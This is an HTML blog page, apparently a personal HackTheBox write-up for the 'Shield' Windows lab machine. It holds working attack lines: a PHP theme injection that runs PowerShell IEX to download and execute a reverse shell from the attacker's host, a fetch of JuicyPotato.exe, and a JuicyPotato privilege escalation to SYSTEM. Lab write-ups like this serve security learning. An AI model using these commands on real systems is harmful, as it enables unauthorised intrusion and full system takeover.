@@ -1,0 +1,508 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>HackTheBox - Shield Writeup - SHAFIQAIMAN</title><meta name="Description" content="HacktheBox - Shield Writeup"><meta property="og:title" content="HackTheBox - Shield Writeup" />
+<meta property="og:description" content="HacktheBox - Shield Writeup" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/posts/htb/shield/" /><meta property="og:image" content="http://localhost:1313/posts/htb/shield/featured.png" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-07-21T00:00:00+00:00" />
+<meta property="article:modified_time" content="2021-07-21T00:00:00+00:00" /><meta property="og:site_name" content="SHAFIQAIMAN" />
+
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:image" content="http://localhost:1313/posts/htb/shield/featured.png" /><meta name="twitter:title" content="HackTheBox - Shield Writeup"/>
+<meta name="twitter:description" content="HacktheBox - Shield Writeup"/>
+<meta name="twitter:site" content="@_shafiqaiman_"/>
+<meta name="application-name" content="SHAFIQAIMAN">
+<meta name="apple-mobile-web-app-title" content="SHAFIQAIMAN"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/htb/shield/" /><link rel="prev" href="http://localhost:1313/posts/htb/vaccine/" /><link rel="next" href="http://localhost:1313/posts/htb/pathfinder/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "HackTheBox - Shield Writeup",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "http:\/\/localhost:1313\/posts\/htb\/shield\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "http:\/\/localhost:1313\/posts\/htb\/shield\/featured.png",
+                            "width":  1067 ,
+                            "height":  662 
+                        }],"genre": "posts","keywords": "juicy-potato, seImpersonatePrivilege, wordpress, reverse-powershell","wordcount":  506 ,
+        "url": "http:\/\/localhost:1313\/posts\/htb\/shield\/","datePublished": "2021-07-21T00:00:00+00:00","dateModified": "2021-07-21T00:00:00+00:00","publisher": {
+            "@type": "Organization",
+            "name": ""},"author": {
+                "@type": "Person",
+                "name": "SH∆FIQ ∆IM∆N"
+            },"description": "HacktheBox - Shield Writeup"
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i>  </a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i>  </a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="SHAFIQAIMAN">SH∆FIQ∆IM∆N</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="Posts"><i class="fa-solid fa-book"></i></a><a class="menu-item" href="/tags/" title="Tags"><i class="fa-solid fa-tags"></i></a><a class="menu-item" href="/categories/" title="Categories"><i class="fa-solid fa-folder"></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HackTheBox - Shield Writeup</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://shafiqaiman.com" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>SH∆FIQ ∆IM∆N</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HacktheBox</a>&nbsp;<a href="/categories/windows/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Windows</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="21-07-2021">21-07-2021</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;506 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;3 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/posts/htb/shield/featured.png"
+        data-srcset="/posts/htb/shield/featured.png, /posts/htb/shield/featured.png 1.5x, /posts/htb/shield/featured.png 2x"
+        data-sizes="auto"
+        alt="/posts/htb/shield/featured.png"
+        title="HacktheBox - Shield Writeup" /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#webpage">WebPage</a>
+      <ul>
+        <li><a href="#gobuster">Gobuster</a></li>
+        <li><a href="#wordpress">WordPress</a></li>
+        <li><a href="#admin-login">Admin Login</a></li>
+      </ul>
+    </li>
+    <li><a href="#footholdgaining-access">Foothold/Gaining Access</a>
+      <ul>
+        <li><a href="#wordpress-theme-injection">WordPress Theme Injection</a></li>
+        <li><a href="#seimpersonateprivilege">SeImpersonatePrivilege</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a>
+      <ul>
+        <li><a href="#potato">POTATO</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>Box author | <span class="h-card person-mention"><a href="https://app.hackthebox.com/users/31190" class="u-url url"><img class="u-photo photo" src="https://www.hackthebox.com/storage/avatars/f7a696a1331031242f713514b7a4621a.png" alt="TRX">&#8201;<span class="p-name fn">TRX</span></a></span></p>
+<h2 id="enumeration">Enumeration</h2>
+<ul>
+<li>scan top 1000 ports</li>
+<li>the result</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sC -sV -oN nmap/initial 10.10.10.29
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/posts/htb/shield/1.png" title="nmap initial scan" data-thumbnail="/posts/htb/shield/1.png" data-sub-html="<h2>nmap initial scan</h2><p>nmap initial scan</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/shield/1.png"
+            data-srcset="/posts/htb/shield/1.png, /posts/htb/shield/1.png 1.5x, /posts/htb/shield/1.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/shield/1.png" width="1010" height="475" />
+    </a><figcaption class="image-caption">nmap initial scan</figcaption>
+    </figure></p>
+<ul>
+<li>scan all ports</li>
+<li>the result</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sC -sV -p- -oN nmap/all_ports 10.10.10.29
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/posts/htb/shield/2.png" title="nmap allports scan" data-thumbnail="/posts/htb/shield/2.png" data-sub-html="<h2>nmap allports scan</h2><p>nmap allports scan</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/shield/2.png"
+            data-srcset="/posts/htb/shield/2.png, /posts/htb/shield/2.png 1.5x, /posts/htb/shield/2.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/shield/2.png" width="1118" height="482" />
+    </a><figcaption class="image-caption">nmap allports scan</figcaption>
+    </figure></p>
+<ul>
+<li>all scan still the same</li>
+<li>open ports
+<ul>
+<li>80 / http</li>
+<li>3306 / mysql</li>
+</ul>
+</li>
+</ul>
+<h2 id="webpage">WebPage</h2>
+<ul>
+<li>Just default windows server page</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/shield/3.png" title="IIS default page" data-thumbnail="/posts/htb/shield/3.png" data-sub-html="<h2>IIS default page</h2><p>IIS default page</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/shield/3.png"
+            data-srcset="/posts/htb/shield/3.png, /posts/htb/shield/3.png 1.5x, /posts/htb/shield/3.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/shield/3.png" width="922" height="772" />
+    </a><figcaption class="image-caption">IIS default page</figcaption>
+    </figure></p>
+<h3 id="gobuster">Gobuster</h3>
+<ul>
+<li>Using gobuster to find any hidden directory</li>
+<li>the result</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/shield/4.png" title="gobuster" data-thumbnail="/posts/htb/shield/4.png" data-sub-html="<h2>gobuster</h2><p>gobuster</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/shield/4.png"
+            data-srcset="/posts/htb/shield/4.png, /posts/htb/shield/4.png 1.5x, /posts/htb/shield/4.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/shield/4.png" width="968" height="416" />
+    </a><figcaption class="image-caption">gobuster</figcaption>
+    </figure></p>
+<h3 id="wordpress">WordPress</h3>
+<ul>
+<li>the result show this server have <code>wordpress</code> install</li>
+<li>as we know, the wordpress login path is <code>/wp-admin</code></li>
+<li>let&rsquo;s take a look</li>
+</ul>
+<h3 id="admin-login">Admin Login</h3>
+<ul>
+<li>Try to login as admin with credentials from previous box <code>vaccine</code></li>
+<li>Success</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/shield/7.png" title="wordpress admin" data-thumbnail="/posts/htb/shield/7.png" data-sub-html="<h2>wordpress admin</h2><p>wordpress admin</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/shield/7.png"
+            data-srcset="/posts/htb/shield/7.png, /posts/htb/shield/7.png 1.5x, /posts/htb/shield/7.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/shield/7.png" width="1097" height="659" />
+    </a><figcaption class="image-caption">wordpress admin</figcaption>
+    </figure></p>
+<h2 id="footholdgaining-access">Foothold/Gaining Access</h2>
+<h3 id="wordpress-theme-injection">WordPress Theme Injection</h3>
+<ul>
+<li>Let&rsquo;s try get the reverse shell by injected the theme</li>
+<li>I&rsquo;m gonna use this theme &ldquo;GutenBooster&rdquo;
+<ul>
+<li>and the shell I&rsquo;m gonna use <a href="https://github.com/samratashok/nishang" target="_blank" rel="noopener noreffer ">Nishang</a></li>
+</ul>
+</li>
+<li>Now, I&rsquo;m gonna put command in the <code>404.php</code>.</li>
+<li>Which is a 404 template</li>
+<li>Source
+<ul>
+<li><a href="https://www.hackingarticles.in/wordpress-reverse-shell/" target="_blank" rel="noopener noreffer ">Wordpress: Reverse Shell</a></li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nx">exec</span><span class="p">(</span><span class="s1">&#39;powershell IEX(IWR http://10.10.16.13:8000/rev.ps1 -UseBasicParsing)&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>This command will download the reverse shell and execute it</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/shield/8.png" title="get shell" data-thumbnail="/posts/htb/shield/8.png" data-sub-html="<h2>get shell</h2><p>get shell</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/shield/8.png"
+            data-srcset="/posts/htb/shield/8.png, /posts/htb/shield/8.png 1.5x, /posts/htb/shield/8.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/shield/8.png" width="1268" height="427" />
+    </a><figcaption class="image-caption">get shell</figcaption>
+    </figure></p>
+<ul>
+<li>Well, the reverse shell is succefully execute</li>
+</ul>
+<h3 id="seimpersonateprivilege">SeImpersonatePrivilege</h3>
+<ul>
+<li>
+<p>everytime you&rsquo;ve got <code>powershell reverse shell</code></p>
+</li>
+<li>
+<p>make sure to run</p>
+<ul>
+<li><code>whoami /all</code></li>
+</ul>
+</li>
+<li>
+<p>The result</p>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/shield/9.png" title="SeImpersonatePrivilege token" data-thumbnail="/posts/htb/shield/9.png" data-sub-html="<h2>SeImpersonatePrivilege token</h2><p>SeImpersonatePrivilege token</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/shield/9.png"
+            data-srcset="/posts/htb/shield/9.png, /posts/htb/shield/9.png 1.5x, /posts/htb/shield/9.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/shield/9.png" width="1234" height="755" />
+    </a><figcaption class="image-caption">SeImpersonatePrivilege token</figcaption>
+    </figure></p>
+<ul>
+<li>Looks like <code>SeImpersonatePrivilege is enable </code></li>
+<li>We can privesc by using <code>juicy potato</code></li>
+<li>Source
+<ul>
+<li><a href="https://github.com/ohpe/juicy-potato" target="_blank" rel="noopener noreffer ">JuicyPotato - Github</a></li>
+</ul>
+</li>
+<li>download the binary into <code>local machine</code>. Then, upload into <code>victim machine</code></li>
+<li>via this command</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">IWR </span><span class="n">http</span><span class="err">:</span><span class="p">//</span><span class="mf">10.10</span><span class="p">.</span><span class="py">16</span><span class="p">.</span><span class="mf">34</span><span class="err">:</span><span class="mf">8000</span><span class="p">/</span><span class="n">JuicyPotato</span><span class="p">.</span><span class="py">exe</span> <span class="n">-outfile</span> <span class="n">again_gimme</span><span class="p">.</span><span class="py">exe</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>then run the binary.</li>
+<li>the result</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/shield/12.png" title="juicy potato" data-thumbnail="/posts/htb/shield/12.png" data-sub-html="<h2>juicy potato</h2><p>juicy potato</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/shield/12.png"
+            data-srcset="/posts/htb/shield/12.png, /posts/htb/shield/12.png 1.5x, /posts/htb/shield/12.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/shield/12.png" width="898" height="402" />
+    </a><figcaption class="image-caption">juicy potato</figcaption>
+    </figure></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<ul>
+<li>First, I&rsquo;m gonna make <code>bat</code> file with powershell command on it.</li>
+<li>I&rsquo;m called the file <code>yo_my.bat</code></li>
+<li>the command:</li>
+<li>Source
+<ul>
+<li><a href="https://youtu.be/1ae64CdwLHE?t=2563" target="_blank" rel="noopener noreffer ">IppSec - Making bat file</a></li>
+</ul>
+</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">powershell</span> <span class="s2">&#34;(IEX(IWR http://10.10.16.34:8000/rev.ps1 -UseBasicParsing))&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="potato">POTATO</h3>
+<ul>
+<li>
+<p>I&rsquo;m gonna run <code>again_gimme.exe</code> again with this flag:</p>
+<ul>
+<li><code>./again_gimme.exe -t * -p yo_my.bat -l 9902</code></li>
+</ul>
+</li>
+<li>
+<p>the result</p>
+</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/shield/13.png" title="juicy potato failed" data-thumbnail="/posts/htb/shield/13.png" data-sub-html="<h2>juicy potato failed</h2><p>juicy potato failed</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/shield/13.png"
+            data-srcset="/posts/htb/shield/13.png, /posts/htb/shield/13.png 1.5x, /posts/htb/shield/13.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/shield/13.png" width="1271" height="112" />
+    </a><figcaption class="image-caption">juicy potato failed</figcaption>
+    </figure></p>
+<ul>
+<li>it is failed but we can try with more <code>CLSID</code></li>
+<li>Source
+<ul>
+<li><a href="https://youtube.com/watch?v=1ae64CdwLHE&amp;t=2675" target="_blank" rel="noopener noreffer ">IppSec - JuicyPotato fails with the default CLSID, changing it up to get it working.</a></li>
+<li><a href="http://ohpe.it/juicy-potato/CLSID/" target="_blank" rel="noopener noreffer ">Windows CLSID</a></li>
+</ul>
+</li>
+<li>before we start using the CLSID. We&rsquo;re need to know what type of <code>OS version</code> this machine running on</li>
+<li>by using this command:</li>
+<li><code>(Get-WmiObject Win32_OperatingSystem).Caption</code></li>
+<li>the result</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/shield/14.png" title="check OS version" data-thumbnail="/posts/htb/shield/14.png" data-sub-html="<h2>check OS version</h2><p>check OS version</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/shield/14.png"
+            data-srcset="/posts/htb/shield/14.png, /posts/htb/shield/14.png 1.5x, /posts/htb/shield/14.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/shield/14.png" width="1101" height="70" />
+    </a><figcaption class="image-caption">check OS version</figcaption>
+    </figure></p>
+<ul>
+<li>Now, we&rsquo;re need to pick <a href="http://ohpe.it/juicy-potato/CLSID/Windows_Server_2016_Standard/" target="_blank" rel="noopener noreffer ">Windows Server 2016 Standard CLSID</a></li>
+<li>I&rsquo;m gonna try with <code>wpnservice CLSID</code></li>
+<li>I&rsquo;m gonna run this command</li>
+</ul>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">.\</span><span class="n">again_gimme</span><span class="p">.</span><span class="py">exe</span> <span class="n">-t</span> <span class="p">*</span> <span class="n">-p</span> <span class="n">yo_my</span><span class="p">.</span><span class="py">bat</span> <span class="n">-l</span> <span class="mf">9902</span> <span class="n">-c</span> <span class="s1">&#39;{7A6D9C0A-1E7A-41B6-82B4-C3F7A27BA381}&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="details admonition warning open">
+        <div class="details-summary admonition-title">
+            <i class="icon fas fa-exclamation-triangle fa-fw" aria-hidden="true"></i>Note<i class="details-icon fas fa-angle-right fa-fw" aria-hidden="true"></i>
+        </div>
+        <div class="details-content">
+            <div class="admonition-content">Make sure you&rsquo;re running the <code>nc</code> for listening the connection </br>
+<strong>REMEMBER</strong>: The powershell command in the <code>bat file</code> was downloading another reverse shell file called <code>rev.ps1</code>.
+in that file. I&rsquo;m listening on 9901. If you listen on the other port. Just change the port on that file.</div>
+        </div>
+    </div>
+<ul>
+<li>the result</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/shield/15.png" title="shell as nt authority\system" data-thumbnail="/posts/htb/shield/15.png" data-sub-html="<h2>shell as nt authority\system</h2><p>shell as nt authority\system</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/shield/15.png"
+            data-srcset="/posts/htb/shield/15.png, /posts/htb/shield/15.png 1.5x, /posts/htb/shield/15.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/shield/15.png" width="639" height="204" />
+    </a><figcaption class="image-caption">shell as nt authority\system</figcaption>
+    </figure></p>
+<ul>
+<li>we&rsquo;ve got the root flag</li>
+</ul>
+<p><figure><a class="lightgallery" href="/posts/htb/shield/16.png" title="root flag" data-thumbnail="/posts/htb/shield/16.png" data-sub-html="<h2>root flag</h2><p>root flag</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/posts/htb/shield/16.png"
+            data-srcset="/posts/htb/shield/16.png, /posts/htb/shield/16.png 1.5x, /posts/htb/shield/16.png 2x"
+            data-sizes="auto"
+            alt="/posts/htb/shield/16.png" width="650" height="271" />
+    </a><figcaption class="image-caption">root flag</figcaption>
+    </figure></p>
+<h2 id="conclusion">Conclusion</h2>
+<p>I&rsquo;ve learned a lot today. Do not put any credentials on the exposure machine to the hacker or non-secure machine. Even tho it&rsquo;s happened, quickly change the password. I&rsquo;m also introducing a bunch of tools for windows pentest/hack. Lastly, always update and patch the machine.</p>
+<p>I have a fun time doing this machine and I hope you guys do too. Bye ;)</p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 21-07-2021</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://localhost:1313/posts/htb/shield/" data-title="HackTheBox - Shield Writeup" data-via="_shafiqaiman_" data-hashtags="juicy-potato,seImpersonatePrivilege,wordpress,reverse-powershell"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="http://localhost:1313/posts/htb/shield/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/posts/htb/shield/" data-title="HackTheBox - Shield Writeup"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Reddit" data-sharer="reddit" data-url="http://localhost:1313/posts/htb/shield/"><i class="fab fa-reddit fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/juicy-potato/">Juicy-Potato</a>,&nbsp;<a href="/tags/seimpersonateprivilege/">SeImpersonatePrivilege</a>,&nbsp;<a href="/tags/wordpress/">Wordpress</a>,&nbsp;<a href="/tags/reverse-powershell/">Reverse-Powershell</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/htb/vaccine/" class="prev" rel="prev" title="HackTheBox - Vaccine Writeup"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>HackTheBox - Vaccine Writeup</a>
+            <a href="/posts/htb/pathfinder/" class="next" rel="next" title="HackTheBox - Pathfinder Writeup">HackTheBox - Pathfinder Writeup<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2021 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://shafiqaiman.com" target="_blank">SHAFIQAIMAN</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/css/lightgallery-bundle.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
